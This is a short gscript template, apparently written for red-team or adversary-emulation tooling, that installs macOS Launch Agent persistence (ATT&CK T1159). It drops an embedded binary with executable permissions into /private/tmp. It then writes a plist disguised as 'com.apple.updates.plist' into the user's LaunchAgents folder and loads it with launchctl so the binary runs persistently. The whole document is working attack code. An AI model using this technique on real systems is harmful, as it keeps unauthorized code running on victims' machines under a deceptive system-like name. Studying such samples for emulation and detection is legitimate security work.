// Example gscript template
// Title: Launch Agent Persistence
// Author: ahhh
// Purpose: Drop a sample binary and a launch agent plist and persist it using Launch Agent
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1159

//priority:90
//timeout:150
//import:/private/tmp/example.macho
//import:/private/tmp/example_agent.plist

var plist_name = "com.apple.updates.plist";

function BeforeDeploy() {
  LogInfo("starting execution of Launch Agent Persistence");
  return true; 
}

function Deploy() {
  // Drop the sample
  var example = Asset("example.macho");
  var name = "/private/tmp/agent_example";
  WriteFile(name, example.fileData, 0755);
  LogInfo("dropped the example binary here: "+name);
  
  // Persist the launch agent plist
  var example_agent = Asset("example_agent.plist");
  var whoami = GetUser();
  var home = "/Users/"+whoami.username;
  var location1 = home + "/Library/LaunchAgents/" + plist_name;
  var location2 = "/System/Library/LaunchAgents/" + plist_name;
  var location3 = "/Library/LaunchAgents/" + plist_name;
  WriteFile(location1, example_agent.fileData, 0755);
  ExecuteCommand("launchctl", ["load", "-w", location1]);
  console.log("Persisted binary using Launch Agent, with the plist: "+location1);

  return true;
}

function AfterDeploy() {
  LogInfo("done, deployed binary with Launch Agent persistence");
  return true;
}